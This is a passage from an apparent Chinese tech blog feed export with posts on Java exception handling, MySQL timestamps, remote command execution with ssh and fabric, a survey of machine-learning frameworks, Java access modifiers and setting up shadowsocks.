<h2 id="异常的捕获"><a href="#异常的捕获" class="headerlink" title="异常的捕获"></a>异常的捕获</h2><p>• 在Service层中应该捕获Dao层抛出的异常并且包装成相应的异常，如业务异常、系统异常等</p>
<p>  业务层中，通过异常链保存原始异常信息。程序员必须自己编码来保存原始异常的信息。在业务逻辑中，捕获DataAccessException异常，处理包装成SystemException异常抛出。捕获ObjectNotFoundException，DuplicateKeyException异常，处理包装成BusinessException异常抛出。业务层中应根据业务的不同，将异常尽量分得细一点，否则，自定义的异常没有太多的意义。</p>
<p>来自 <a href="http://gaojiewyh.iteye.com/blog/1739662" rel="external nofollow noopener noreferrer" target="_blank">http://gaojiewyh.iteye.com/blog/1739662</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public addUser(User user) throws BusinessException,SystemException&#123;  </span><br><span class="line">        try&#123;  </span><br><span class="line">              userDao.addUser(user);  </span><br><span class="line">        &#125;catch(DuplicatekeyException ex)&#123;  </span><br><span class="line">             log.infor(&quot;......................&quot;);  </span><br><span class="line">             throw new BusinessException(ex.getCause(),&quot;国际化信息&quot;）；  </span><br><span class="line">        &#125;catch(DataAccessException ex)&#123;  </span><br><span class="line">             log.error(&quot;......................&quot;);  </span><br><span class="line">             throw new SystemException(ex.getCause(),&quot;国际化信息&quot;）；  </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="常见误区"><a href="#常见误区" class="headerlink" title="常见误区"></a>常见误区</h2><h3 id="一、定义上捕获者需要用到的信息"><a href="#一、定义上捕获者需要用到的信息" class="headerlink" title="一、定义上捕获者需要用到的信息"></a>一、定义上捕获者需要用到的信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public class DuplicateUsernameException extends Exception &#123;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="理由"><a href="#理由" class="headerlink" title="理由:"></a>理由:</h4><p>它除了有一个”意义明确”的名字以外没有任何有用的信息了。不要忘记Exception跟其他的Java类一样，客户端可以调用其中的方法来得到更多的信息。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public class DuplicateUsernameException extends Exception &#123;</span><br><span class="line">    private static final long serialVersionUID = -6113064394525919823L;</span><br><span class="line">    private String username = null;</span><br><span class="line">    private String[] availableNames = new String[0];</span><br><span class="line"> </span><br><span class="line">    public DuplicateUsernameException(String username) &#123;</span><br><span class="line">            this.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public DuplicateUsernameException(String username, String[] availableNames) &#123;</span><br><span class="line">            this(username);</span><br><span class="line">            this.availableNames = availableNames;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public String requestedUsername() &#123;</span><br><span class="line">            return this.username;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public String[] availableNames() &#123;</span><br><span class="line">            return this.availableNames;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>来自 <a href="http://www.iteye.com/topic/857443" rel="external nofollow noopener noreferrer" target="_blank">http://www.iteye.com/topic/857443</a></p>
<h3 id="二、尽可能避免（因抛出异常带来的）接口污染"><a href="#二、尽可能避免（因抛出异常带来的）接口污染" class="headerlink" title="二、尽可能避免（因抛出异常带来的）接口污染"></a>二、尽可能避免（因抛出异常带来的）接口污染</h3><p>来自 <a href="http://lavasoft.blog.51cto.com/62575/244138/" rel="external nofollow noopener noreferrer" target="_blank">http://lavasoft.blog.51cto.com/62575/244138/</a></p>
<h3 id="三、异常链传播"><a href="#三、异常链传播" class="headerlink" title="三、异常链传播"></a>三、异常链传播</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public void dataAccessCode()&#123;</span><br><span class="line">    try&#123;</span><br><span class="line">        ..some code that throws SQLException</span><br><span class="line">    &#125;catch(SQLException ex)&#123;</span><br><span class="line">        throw new RuntimeException(ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><ol>
<li><p><a href="http://www.onjava.com/pub/a/onjava/2003/11/19/exceptions.html?page=2" rel="external nofollow noopener noreferrer" target="_blank">Best Practices for Exception Handling</a></p>
</li>
<li><p><a href="http://gaojiewyh.iteye.com/blog/1739662" rel="external nofollow noopener noreferrer" target="_blank">基于Spring的异常体系处理</a></p>
</li>
<li><p><a href="http://gaojiewyh.iteye.com/blog/1297746#bc2369985" rel="external nofollow noopener noreferrer" target="_blank">spring mvc 异常统一处理</a></p>
</li>
<li><p><a href="https://github.com/kyfxbl/blog/blob/master/source/_posts/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5.md" rel="external nofollow noopener noreferrer" target="_blank">异常处理最佳实践.md</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> exception </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mysql中时间相关的问题]]></title>
      <url>http://qsli.github.io/2016/09/25/mysql-time/</url>
      <content type="html"><![CDATA[<h2 id="自动更新时间戳"><a href="#自动更新时间戳" class="headerlink" title="自动更新时间戳"></a>自动更新时间戳</h2><blockquote>
<p>TIMESTAMP and DATETIME columns can be automatically initializated and updated to the current date and time (that is, the current timestamp).</p>
</blockquote>
<blockquote>
<p>For any TIMESTAMP or DATETIME column in a table, you can assign the current timestamp as the default value, the auto-update value, or both:</p>
</blockquote>
<p><a href="http://dev.mysql.com/doc/refman/5.7/en/timestamp-initialization.html" rel="external nofollow noopener noreferrer" target="_blank">mysql官方文档说明</a></p>
<p>代码示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE t1 (</span><br><span class="line">  ts TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,</span><br><span class="line">  dt DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<h2 id="多个timestamp"><a href="#多个timestamp" class="headerlink" title="多个timestamp"></a>多个timestamp</h2><p>mysql中默认一张表中只能有一个timestamp类型的字段，如果有多个的话创建表的时候就会报错</p>
<p><code>Incorrect table definition; there can be only one TIMESTAMP column with CURRENT_TIMESTAMP in DEFAULT or ON UPDATE clause</code></p>
<p>在<code>5.6.4</code>之前有这个限制，在之后好像就没有这个限制了。参见<a href="https://segmentfault.com/q/1010000000488523" rel="external nofollow noopener noreferrer" target="_blank">https://segmentfault.com/q/1010000000488523</a></p>
]]></content>
      
        <categories>
            
            <category> base </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[fabric 分布式部署]]></title>
      <url>http://qsli.github.io/2015/11/03/fabric/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>   在一台linux主机上执行命令，如果太繁琐可以写成 Shell 脚本；如果在一个集群上批量执行命令呢？<br>一台一台的ssh登录去执行当然是可以的，如果集群太大，就太繁琐了。下面介绍一些在集群上执行命令的方法。</p>
<h2 id="ssh-远程执行命令"><a href="#ssh-远程执行命令" class="headerlink" title="ssh 远程执行命令"></a>ssh 远程执行命令</h2><pre><code>通过 ssh 可以按照下面的方式远程执行命令
</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user@host <span class="string">'command1;command2;command3'</span></span><br></pre></td></tr></table></figure>
<p>或者使用管道<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user@host <span class="string">'command1|command2|command3'</span></span><br></pre></td></tr></table></figure></p>
<p>或者使用如下的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ssh [user]@[server] &lt;&lt; EOF</span><br><span class="line"><span class="built_in">command</span> 1</span><br><span class="line"><span class="built_in">command</span> 2</span><br><span class="line"><span class="built_in">command</span> 3</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></p>
<p>或者将要执行的命令写入 Shell 脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh user@host <span class="string">'bash -s'</span> &lt; local_script.sh</span><br></pre></td></tr></table></figure></p>
<p>可以通过指定ssh 参数 <code>-o StrictHostKeyChecking=no</code> 来省去下面的交互过程 </p>
<p><img src="http://farm8.staticflickr.com/7399/8778510478_4a428cc5f4.jpg" alt></p>
<p><strong>但是上面的方法执行 sudo 命令的时候会出错</strong><br>此时需要加上 ssh 的 <code>-t</code> 参数<br>man 一下 ssh 查找 -t 参数可以看到如下的解释</p>
<blockquote>
<p>-t<br>Force pseudo-tty allocation.  This can be used to execute arbi‐<br>             trary screen-based programs on a remote machine, which can be<br>             very useful, e.g. when implementing menu services.  Multiple -t<br>             options force tty allocation, even if ssh has no local tty.</p>
</blockquote>
<p>具体的意思就是强制提供一个远程服务器的虚拟tty终端<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -t -p port user@host <span class="string">'cmd'</span></span><br></pre></td></tr></table></figure></p>
<h2 id="即可执行sudo命令，但是自己还要手工输入远程服务器的密码"><a href="#即可执行sudo命令，但是自己还要手工输入远程服务器的密码" class="headerlink" title="即可执行sudo命令，但是自己还要手工输入远程服务器的密码"></a>即可执行sudo命令，但是自己还要手工输入远程服务器的密码</h2><p>要想写在脚本中自动执行还需要使用 expect<br>expect是 linux下的一个命令用来处理执行命令中的交互，python 也有相应的库 pexpect</p>
<blockquote>
<p>Expect  is a program that “talks” to other interactive programs accord‐<br>       ing to a script. </p>
</blockquote>
<p>下面是参考的一些文章</p>
<blockquote>
<p><a href="http://malcontentcomics.com/systemsboy/2006/07/send-remote-commands-via-ssh.html" rel="external nofollow noopener noreferrer" target="_blank">Send Remote Commands Via SSH</a><br><a href="http://www.shellhacks.com/en/Running-Commands-on-a-Remote-Linux-Server-over-SSH" rel="external nofollow noopener noreferrer" target="_blank">Running Commands on a Remote Linux Server over SSH</a></p>
</blockquote>
<h2 id="其他集群管理命令"><a href="#其他集群管理命令" class="headerlink" title="其他集群管理命令"></a>其他集群管理命令</h2><p>如 pssh mussh</p>
<blockquote>
<p><a href="http://xiaorui.cc/2014/07/09/linux%E9%9B%86%E7%BE%A4%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7mussh%E5%92%8Cpssh/" rel="external nofollow noopener noreferrer" target="_blank">linux集群管理工具mussh和pssh</a></p>
</blockquote>
<h2 id="fabric"><a href="#fabric" class="headerlink" title="fabric"></a>fabric</h2><p>fabric 是基于 ssh 的一个python库，主要用来做运维或者批量部署<br><a href="http://www.fabfile.org/" rel="external nofollow noopener noreferrer" target="_blank">fabric官网</a></p>
<ul>
<li>安装 fabric<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install fabric</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>安装完成即可使用 fabric，fabric上手简单，功能强大</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fab -f xxx.py <span class="built_in">command</span></span><br></pre></td></tr></table></figure>
<p>fab 默认在当前目录下寻找 fabfiles，如果你的文件是其他的名字，使用 <code>-f</code>指定即可</p>
<p>脚本的编写<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fabric.api <span class="keyword">import</span> run</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">host_type</span><span class="params">()</span>:</span></span><br><span class="line">	run(<span class="string">'uname -s'</span>)</span><br></pre></td></tr></table></figure></p>
<p>运行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ fab -H localhost,linuxbox host_type</span><br><span class="line">	[localhost] run: uname -s</span><br><span class="line">	[localhost] out: Darwin</span><br><span class="line">	[linuxbox] run: uname -s</span><br><span class="line">	[linuxbox] out: Linux</span><br><span class="line">	</span><br><span class="line">	Done.</span><br><span class="line">	Disconnecting from localhost... <span class="keyword">done</span>.</span><br><span class="line">	Disconnecting from linuxbox... <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure></p>
<p>使用 <code>-H</code>可以指定运行的host， 也可以在代码中指定。<br>用户名和密码都是存在 env 环境变量中，也可在脚本中更改<br><a href="http://docs.fabfile.org/en/1.10/usage/env.html?highlight=env" rel="external nofollow noopener noreferrer" target="_blank">The environment dictionary</a></p>
<p>同时 fabric 还提供了一些装饰器，具体的可以查文档<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@parralel</span></span><br><span class="line"><span class="meta">@task</span></span><br><span class="line"><span class="meta">@role()</span></span><br><span class="line"><span class="meta">@host()</span></span><br></pre></td></tr></table></figure></p>
<p>详细讲解可以参考这篇文章 <a href="http://wklken.me/posts/2013/03/25/python-tool-fabric.html" rel="external nofollow noopener noreferrer" target="_blank">Python fabric实现远程操作和部署 </a></p>
]]></content>
      
        <categories>
            
            <category> python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> fabric </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[机器学习框架调研]]></title>
      <url>http://qsli.github.io/2015/11/03/machine_learning/</url>
      <content type="html"><![CDATA[<h1 id="机器学习框架调研"><a href="#机器学习框架调研" class="headerlink" title="机器学习框架调研"></a>机器学习框架调研</h1><h2 id="DMTK"><a href="#DMTK" class="headerlink" title="DMTK"></a>DMTK</h2><p> <img src="http://www.dmtk.io/img/pic1_V7.jpg" width="150" height="150" alt="图片名称" align="center"></p>
<p>项目地址：<a href="https://github.com/Microsoft/DMTK" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/Microsoft/DMTK</a><br>文档地址:<a href="http://www.dmtk.io/document.html" rel="external nofollow noopener noreferrer" target="_blank">http://www.dmtk.io/document.html</a><br>语言: CPP<br>项目简介:<br> Microsoft Distributed Machine Learning Tookit</p>
<ul>
<li><p>DMTK分布式机器学习框架：</p>
<blockquote>
<p>它由参数服务器和客户端软件开发包（SDK）两部分构成。参数服务器在原有基础上从性能和功能上都得到了进一步提升——支持存储混合数据结构模型、接受并聚合工作节点服务器的数据模型更新、控制模型同步逻辑等。客户端软件开发包（SDK）支持维护节点模型缓存（与全局模型服务器同步）、节点模型训练和模型通讯的流水线控制、以及片状调度大模型训练等。</p>
</blockquote>
</li>
<li><p>LightLDA：</p>
<blockquote>
<p>LightLDA是一种全新的用于训练主题模型，计算复杂度与主题数目无关的高效算法。在其分布式实现中，我们做了大量的系统优化使得LightLDA能够在一个普通计算机集群上处理超大规模的数据和模型。例如，在一个由8台计算机组成的集群上，我们可以在具有2千亿训练样本（token）的数据集上训练具有1百万词汇表和1百万个话题（topic）的LDA模型（约1万亿个参数），这种规模的实验以往要在数千台计算机的集群上才能运行。</p>
</blockquote>
</li>
<li><p>分布式词向量：</p>
<blockquote>
<p>词向量技术近来被普遍地应用于计算词汇的语义表示，它可以用作很多自然语言处理任务的词特征。我们为两种计算词向量的算法提供了高效的分步式实现：</p>
<pre><code>1. 一种是标准的word2vec算法
2. 另一种是可以对多义词计算多个词向量的新算法。
</code></pre></blockquote>
</li>
</ul>
<p><img src="http://www.msra.cn/zh-cn/research/release/images/dmtk-2.png" width="500" height="200" alt="图片名称" align="center"></p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p>[1] Tian, F., Dai, H., Bian, J., Gao, B., Zhang, R., Chen, E., &amp; Liu, T. Y. (2014). <a href="http://www.aclweb.org/anthology/C14-1016" rel="external nofollow noopener noreferrer" target="_blank">A probabilistic model for learning multi-prototype word embeddings</a>. In Proceedings of COLING (pp. 151-160).</p>
</blockquote>
<h2 id="TensorFlow"><a href="#TensorFlow" class="headerlink" title="TensorFlow"></a>TensorFlow</h2><p><img src="http://tensorflow.org/images/tensors_flowing.gif" alt></p>
<p>文档地址: <a href="http://tensorflow.org/get_started/index.html" rel="external nofollow noopener noreferrer" target="_blank">http://tensorflow.org/get_started/index.html</a><br>项目地址： <a href="http://tensorflow.org/" rel="external nofollow noopener noreferrer" target="_blank">http://tensorflow.org/</a><br>语言: Python<br>简介：</p>
<blockquote>
<ol>
<li><p>TensorFlow是谷歌研发的第二代人工智能学习系统，而第一代的DistBelief比这个要早好多年。</p>
</li>
<li><p>TensorFlow支持CNN、RNN和LSTM算法，这都是目前在Image，Speech和NLP最流行的深度神经网络模型。</p>
</li>
<li><p>此外，TensorFlow一大亮点是支持异构设备分布式计算，它能够在各个平台上自动运行模型，从电话、单个CPU / GPU到成百上千GPU卡组成的分布式系统。也就是说，任何基于梯度的机器学习算法都能够受益于TensorFlow的自动分化（auto-differentiation）。</p>
</li>
</ol>
</blockquote>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://news.zol.com.cn/551/5513527.html" rel="external nofollow noopener noreferrer" target="_blank">http://news.zol.com.cn/551/5513527.html</a><br><a href="http://www.leiphone.com/news/201511/Voza1pFNQB4bzKdR.html" rel="external nofollow noopener noreferrer" target="_blank">http://www.leiphone.com/news/201511/Voza1pFNQB4bzKdR.html</a></p>
<h2 id="Torch"><a href="#Torch" class="headerlink" title="Torch"></a>Torch</h2><p><img src="http://torch.ch/static/flow-hero-logo.png" alt></p>
<p>项目地址: <a href="https://github.com/torch/torch7" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/torch/torch7</a><br>项目博客: <a href="http://torch.ch/blog/" rel="external nofollow noopener noreferrer" target="_blank">http://torch.ch/blog/</a><br>Slides: <a href="https://github.com/soumith/cvpr2015/blob/master/cvpr-torch.pdf" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/soumith/cvpr2015/blob/master/cvpr-torch.pdf</a><br>语言: Lua<br>项目简介:</p>
<blockquote>
<p>Torch并没有跟随Python的潮流，它是基于Lua的。对于解释器没有必要像Matlab或者Python那样，Lua会给你神奇的控制台。Torch被Facebook人工智能研究实验室和位于伦敦的谷歌DeepMind大量使用。</p>
</blockquote>
<blockquote>
<p>Torch is a scientific computing framework with wide support for machine learning algorithms. It is &gt; &gt; easy to use and efficient, thanks to an easy and fast scripting language, LuaJIT, and an underlying &gt; C/CUDA implementation.</p>
</blockquote>
<blockquote>
<p>A summary of core features:</p>
<ul>
<li>a powerful N-dimensional array</li>
<li>lots of routines for indexing, slicing, transposing, …</li>
<li>amazing interface to C, via LuaJIT</li>
<li>linear algebra routines</li>
<li>neural network, and energy-based models</li>
<li>numeric optimization routines</li>
<li>Fast and efficient GPU support</li>
<li>Embeddable, with ports to iOS, Android and FPGA backends</li>
</ul>
</blockquote>
<h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://www.chinacloud.cn/show.aspx?id=21212&amp;cid=17" rel="external nofollow noopener noreferrer" target="_blank">2015深度学习回顾：ConvNet、Caffe、Torch及其他</a></p>
<h2 id="GraphLab"><a href="#GraphLab" class="headerlink" title="GraphLab"></a>GraphLab</h2><p>项目简介： <a href="http://www.select.cs.cmu.edu/code/graphlab/" rel="external nofollow noopener noreferrer" target="_blank">http://www.select.cs.cmu.edu/code/graphlab/</a><br>语言: Java/Python<br>简介:</p>
<blockquote>
<p>GraphLab是一个流行的图谱分析（Graph Analysis）和机器学习的开源项目，2013年该项目剥离出一个独立运作的商业公司GraphLab Inc</p>
<ul>
<li>HDFS。GraphLab 内置对HDFS 的支持，GraphLab 能够直接从HDFS中读数据或者将计算结果数据直接写入到HDFS 中。</li>
</ul>
</blockquote>
<p><img src="http://www.ctocio.com/wp-content/uploads/2014/10/graphlab-deeplearning-_thumb.png" alt></p>
<h3 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://planckscale.info/?p=226" rel="external nofollow noopener noreferrer" target="_blank">GraphLab Create使深度学习更easy</a><br><a href="https://blog.inf.ed.ac.uk/graphprocs/2014/11/25/graphlab%E6%96%B0%E7%9A%84%E9%9D%A2%E5%90%91%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%B9%B6%E8%A1%8C%E6%A1%86%E6%9E%B6/" rel="external nofollow noopener noreferrer" target="_blank">GraphLab:新的面向机器学习的并行框架</a></p>
<h2 id="Deeplearning4j"><a href="#Deeplearning4j" class="headerlink" title="Deeplearning4j"></a>Deeplearning4j</h2><p>项目文档: <a href="http://deeplearning4j.org/" rel="external nofollow noopener noreferrer" target="_blank">http://deeplearning4j.org/</a><br>项目地址: <a href="https://github.com/deeplearning4j/deeplearning4j" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/deeplearning4j/deeplearning4j</a><br>语言: Java/Scala<br>项目简介:</p>
<blockquote>
<p>Deeplearning4j is the first commercial-grade, open-source, distributed deep-learning library written for Java and Scala. Integrated with Hadoop and Spark, DL4J is designed to be used in business environments, rather than as a research tool.</p>
<ul>
<li>Versatile n-dimensional array class</li>
<li>GPU integration</li>
<li>Scalable on Hadoop, Spark and Akka + AWS et al</li>
</ul>
</blockquote>
<p><img src="http://deeplearning4j.org/img/schematic_overview.png" alt></p>
<h3 id="参考链接-3"><a href="#参考链接-3" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://deeplearning4j.org/compare-dl4j-torch7-pylearn.html" rel="external nofollow noopener noreferrer" target="_blank">DL4J vs. Torch vs. Theano vs. Caffe</a></p>
<h2 id="Caffe"><a href="#Caffe" class="headerlink" title="Caffe"></a>Caffe</h2><p>项目主页: <a href="http://caffe.berkeleyvision.org/" rel="external nofollow noopener noreferrer" target="_blank">http://caffe.berkeleyvision.org/</a><br>项目地址: <a href="https://github.com/BVLC/caffe" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/BVLC/caffe</a><br>Slides: <a href="https://docs.google.com/presentation/d/1UeKXVgRvvxg9OUdh_UiC5G71UMscNPlvArsWER41PsU/edit#slide=id.gc2fcdcce7_216_211" rel="external nofollow noopener noreferrer" target="_blank">https://docs.google.com/presentation/d/1UeKXVgRvvxg9OUdh_UiC5G71UMscNPlvArsWER41PsU/edit#slide=id.gc2fcdcce7_216_211</a><br>项目简介:</p>
<blockquote>
<p>The Caffe framework from UC Berkeley is designed to let researchers create and explore CNNs and other Deep Neural Networks (DNNs) easily, while delivering high speed needed for both experiments and industrial deployment [5]. Caffe provides state-of-the-art modeling for advancing and deploying deep learning in research and industry with support for a wide variety of architectures and efficient implementations of prediction and learning.</p>
</blockquote>
<p><img src="http://d.hiphotos.baidu.com/baike/c0%3Dbaike92%2C5%2C5%2C92%2C30/sign=520e49ddb51bb0519b29bb7a5713b1d1/5882b2b7d0a20cf4cad4bb2070094b36adaf998d.jpg" alt></p>
<p><img src="http://img.ptcms.csdn.net/article/201507/08/559cebc9330f2_middle.jpg" alt></p>
<h3 id="参考链接-4"><a href="#参考链接-4" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://ucb-icsi-vision-group.github.io/caffe-paper/caffe.pdf" rel="external nofollow noopener noreferrer" target="_blank">Caffe: Convolutional Architecture for Fast Feature Embedding</a></p>
<p><a href="http://www.csdn.net/article/1970-01-01/2825166" rel="external nofollow noopener noreferrer" target="_blank">KDnuggets热门深度学习工具排行：Pylearn2 居首，Caffe第三</a></p>
<h2 id="Theano"><a href="#Theano" class="headerlink" title="Theano"></a>Theano</h2><p>项目主页: <a href="http://deeplearning.net/software/theano/" rel="external nofollow noopener noreferrer" target="_blank">http://deeplearning.net/software/theano/</a><br>项目地址: <a href="https://github.com/Theano/Theano" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/Theano/Theano</a></p>
<h2 id="Pylearn2"><a href="#Pylearn2" class="headerlink" title="Pylearn2"></a>Pylearn2</h2><p> 文档地址: <a href="http://deeplearning.net/software/pylearn2/" rel="external nofollow noopener noreferrer" target="_blank">http://deeplearning.net/software/pylearn2/</a><br> 项目地址: <a href="https://github.com/lisa-lab/pylearn2" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/lisa-lab/pylearn2</a><br>项目简介:</p>
<blockquote>
<p>Pylearn2和Theano由同一个开发团队开发，Pylearn2是一个机器学习库，它把深度学习和人工智能研究许多常用的模型以及训练算法封装成一个单一的实验包，如随机梯度下降。</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 机器学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[java 访问权限区别]]></title>
      <url>http://qsli.github.io/2015/10/20/java-permission-control/</url>
      <content type="html"><![CDATA[<h2 id="类成员的访问权限"><a href="#类成员的访问权限" class="headerlink" title="类成员的访问权限"></a>类成员的访问权限</h2><a id="more"></a>
<table>
<thead>
<tr>
<th>Modifier</th>
<th>Class</th>
<th>Package</th>
<th>Subclass</th>
<th>World</th>
</tr>
</thead>
<tbody>
<tr>
<td>public</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>protect</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>x</td>
</tr>
<tr>
<td>no modifier</td>
<td>√</td>
<td>√</td>
<td>x</td>
<td>x</td>
</tr>
<tr>
<td>private</td>
<td>√</td>
<td>x</td>
<td>x</td>
<td>x</td>
</tr>
</tbody>
</table>
<p>没有修饰符的话就相当于package可见，如果子类不在同一个package则也不能访问相应的方法。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
<p><a href="https://docs.oracle.com/javase/tutorial/java/javaOO/accesscontrol.html" rel="external nofollow noopener noreferrer" target="_blank">Controlling Access to Members of a Class</a><br><a href="http://blog.csdn.net/johnstrive/article/details/5880357" rel="external nofollow noopener noreferrer" target="_blank">JAVA修饰符类型</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 访问权限 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux 下使用 shadowsocks]]></title>
      <url>http://qsli.github.io/2015/10/09/shadowsocks/</url>
      <content type="html"><![CDATA[<h2 id="安装shadowsocks"><a href="#安装shadowsocks" class="headerlink" title="安装shadowsocks"></a>安装shadowsocks</h2><p>shadowsocks 是使用 python 编写的，用 python 的包管理软件 pip 安装即可<br>1.首先安装 pip<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install python-pip</span><br></pre></td></tr></table></figure></p>
<p>2.安装 shadowsocks<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install shadowsocks</span><br></pre></td></tr></table></figure></p>
<h2 id="shadowsocks-使用"><a href="#shadowsocks-使用" class="headerlink" title="shadowsocks 使用"></a>shadowsocks 使用</h2><p>shadowsocks 分为两部分，一个 server 名字叫 ssserver ，一个 client 名字叫 sslocal<br>默认都安装在  /usr/local/bin/ 目录下</p>
<h3 id="server-端"><a href="#server-端" class="headerlink" title="server 端"></a><strong>server 端</strong></h3><p>server端主要搭建在自己购买的vps上面<br>如下代码可使其在后台运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ssserver -p 443 -k password -m rc4-md5 --user nobody -d start</span><br></pre></td></tr></table></figure></p>
